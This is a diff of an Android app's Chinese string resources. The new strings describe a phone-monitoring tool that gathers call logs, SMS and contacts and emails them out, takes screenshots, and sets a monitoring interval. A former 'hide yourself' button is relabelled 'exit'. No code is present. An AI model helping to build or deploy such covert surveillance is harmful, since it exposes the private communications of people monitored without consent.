@@ -47,13 +47,17 @@
     <string name="init_btn_getinfo">立即获取信息</string>
     <string name="init_btn_screenshot">截图</string>
     <string name="init_btn_setting">设定</string>
-    <string name="init_btn_hide">隐藏自己</string>
+    <string name="init_btn_hide">退出</string>
+	<string name="init_hint_getinfo">获得当前手机的通话记录，短信和联系人信息，并发送至邮箱</string>
+    <string name="init_hint_screenshot">获得当前手机截屏并发送至信箱</string>
+    <string name="init_hint_setting">设置用户名，注册号，邮箱及监控时间间隔</string>
+    <string name="init_hint_hide">退出当前对话框</string>
     
     <!-- License -->
-    <string name="licensed_yes">已通过认证，谢谢您的使用！</string>
-    <string name="licensed_no">错误的邮件地址或注册码</string>
+    <string name="licensed_yes">已通过认证，感谢您的使用！</string>
+    <string name="licensed_no">错误的用户名或注册码</string>
     <string name="pls_input_serial_num">请输入注册码</string>
-    <string name="pls_input_mail">请输入正确的邮箱地址</string>
+    <string name="pls_input_mail">邮箱地址错误，请输入正确的邮箱地址</string>
     <string name="pls_input_username">请输入用户名</string>
     
 </resources>
